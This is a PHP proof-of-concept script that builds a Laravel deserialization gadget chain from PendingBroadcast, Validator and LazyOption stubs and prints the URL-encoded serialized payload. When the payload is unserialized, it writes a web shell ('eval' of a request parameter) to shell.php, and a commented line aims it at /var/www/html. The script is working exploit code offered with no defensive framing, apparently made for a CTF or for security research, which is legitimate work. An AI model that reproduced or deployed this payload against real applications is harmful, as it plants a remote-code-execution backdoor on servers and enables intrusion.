<?php
namespace Illuminate\Broadcasting{
    class PendingBroadcast{
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}
namespace Illuminate\Validation{
    class Validator{
        public $extensions;
        public function __construct($a){
            $this->extensions = $a;
        }
    }
}
namespace PhpOption{
    final class LazyOption{
        private $callback;
        private $arguments;
        private $option;

        public function __construct($callback, $arguments, $option)
        {
            $this->callback = $callback;
            $this->arguments = $arguments;
            $this->option = $option;
        }

    }
}
namespace{
    use Illuminate\Broadcasting\PendingBroadcast;
    use Illuminate\Validation\Validator;
    use PhpOption\LazyOption;
    $c = new LazyOption('file_put_contents', array('.\shell.php', '<?php eval($_REQUEST[diggid]);?>'), null);
    /* $c = new PhpOption\LazyOption('file_put_contents', array('/var/www/html/shell.php', '<?php eval($_REQUEST[diggid]);?>'), null);*/
    $b = new Validator(array(''=>array($c, 'filter')));
    $a = new PendingBroadcast($b, "");
    echo urlencode(serialize($a));
}
